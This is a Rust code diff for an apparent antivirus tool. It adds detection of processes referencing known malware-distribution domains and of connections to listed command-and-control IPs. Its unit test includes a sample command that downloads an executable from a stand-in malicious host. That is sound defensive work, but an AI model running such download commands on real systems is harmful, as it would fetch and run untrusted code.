@@ -61,6 +61,11 @@ struct Signatures {
     pool_domains: Vec<String>,
     #[serde(default)]
     pool_ports: Vec<u16>,
+    /// Адреса управляющих серверов вредоносов (Feodo, SSLBL, ThreatFox) и домены, раздающие вредоносное (URLhaus, NoCoin).
+    #[serde(default)]
+    bad_ips: Vec<String>,
+    #[serde(default)]
+    bad_domains: Vec<String>,
 }
 
 /// Окружение проверки: каталог данных антивируса и приёмник прогресса. Не привязано к окну Tauri, поэтому та же проверка
@@ -354,6 +359,20 @@ fn match_cmdline<'a>(sigs: &'a Signatures, cmd: &str) -> Option<&'a str> {
         .map(|s| s.as_str())
         .find(|s| lower.contains(&s.to_lowercase()))
         .or_else(|| sigs.pool_domains.iter().map(|s| s.as_str()).find(|d| lower.contains(&d.to_lowercase())))
+}
+
+/// Домен из списка вредоносных, упомянутый в командной строке.
+fn match_bad_domain<'a>(sigs: &'a Signatures, cmd: &str) -> Option<&'a str> {
+    let lower = cmd.to_lowercase();
+    if !lower.contains('.') {
+        return None;
+    }
+    sigs.bad_domains.iter().map(|d| d.as_str()).find(|d| d.len() >= 6 && lower.contains(d))
+}
+
+/// Множество адресов C2 для быстрой проверки соединений.
+pub fn bad_ip_set(app: &AppHandle) -> HashSet<String> {
+    load_signatures(app).bad_ips.into_iter().collect()
 }
 
 #[derive(Serialize, Clone)]
@@ -655,6 +674,21 @@ fn scan_processes(env: &Env, ctx: &mut Ctx) -> HashMap<u64, String> {
             hit = ctx.check_file(path, "process", Some(pid));
         }
         if !hit {
+            if let Some(dom) = match_bad_domain(&ctx.sigs, cmd).map(|d| d.to_string()) {
+                if !is_protected(Path::new(path), &ctx.own) && !ctx.excluded(path, None) {
+                    ctx.push(Detection {
+                        id: detection_id("baddom", &format!("{pid}:{dom}")),
+                        kind: "process".into(),
+                        severity: "medium".into(),
+                        title: format!("Процесс обращается к вредоносному домену: {name}"),
+                        detail: format!("В командной строке — «{dom}», домен из списков сайтов, раздающих вредоносное."),
+                        path: if path.is_empty() { None } else { Some(path.into()) },
+                        pid: Some(pid),
+                        sha256: None,
+                        extra: json!({ "label": name }),
+                    });
+                }
+            }
             if let Some(sig) = match_cmdline(&ctx.sigs, cmd).map(|s| s.to_string()) {
                 if !ctx.excluded(path, None) && !is_protected(Path::new(path), &ctx.own) && !cmd.is_empty() {
                     ctx.push(Detection {
@@ -685,6 +719,21 @@ fn scan_network(env: &Env, ctx: &mut Ctx, pnames: &HashMap<u64, String>) {
         let pid = item["OwningProcess"].as_u64().unwrap_or(0);
         let port = item["RemotePort"].as_u64().unwrap_or(0) as u16;
         let addr = item["RemoteAddress"].as_str().unwrap_or("");
+        if pid != 0 && ctx.sigs.bad_ips.iter().any(|b| b == addr) {
+            let name = pnames.get(&pid).cloned().unwrap_or_default();
+            ctx.push(Detection {
+                id: detection_id("c2", &format!("{pid}:{addr}")),
+                kind: "connection".into(),
+                severity: "high".into(),
+                title: format!("Соединение с известным управляющим сервером: {}", if name.is_empty() { "неизвестный процесс" } else { &name }),
+                detail: format!("Адрес {addr}:{port} числится в списках серверов управления вредоносами (C2). Завершите процесс и проверьте его файл."),
+                path: None,
+                pid: Some(pid),
+                sha256: None,
+                extra: json!({ "remote": format!("{addr}:{port}") }),
+            });
+            continue;
+        }
         if pid == 0 || !ctx.sigs.pool_ports.contains(&port) || addr.starts_with("127.") || addr == "::1" {
             continue;
         }
@@ -1015,6 +1064,8 @@ pub fn av_status(app: AppHandle) -> Value {
         "version": sigs.version,
         "updated": sigs.updated,
         "hashes": sigs.sha256.len(),
+        "ips": sigs.bad_ips.len(),
+        "domains": sigs.bad_domains.len(),
         "rules": sigs.names.len() + sigs.cmdline.len() + sigs.pool_domains.len(),
         "quarantine": load_quarantine(&app).len(),
         "exclusions": { "paths": load_exclusions(&app).paths.len(), "hashes": load_exclusions(&app).hashes.len() },
@@ -1283,6 +1334,17 @@ mod tests {
         assert!(match_name(&s, "chrome").is_none());
         assert!(match_name(&s, "minerva").is_none());
         assert!(match_name(&s, "app").is_none());
+    }
+
+    #[test]
+    fn bad_domains_and_ips() {
+        let mut s = sigs();
+        s.bad_domains = vec!["evil-cdn.example".into(), "x.io".into()];
+        s.bad_ips = vec!["203.0.113.9".into()];
+        assert_eq!(match_bad_domain(&s, "curl https://evil-cdn.example/a.exe"), Some("evil-cdn.example"));
+        assert!(match_bad_domain(&s, "curl https://github.com/a").is_none());
+        assert!(match_bad_domain(&s, "x.io").is_none()); // слишком короткие записи не используем: много ложных
+        assert!(s.bad_ips.iter().any(|b| b == "203.0.113.9"));
     }
 
     #[test]
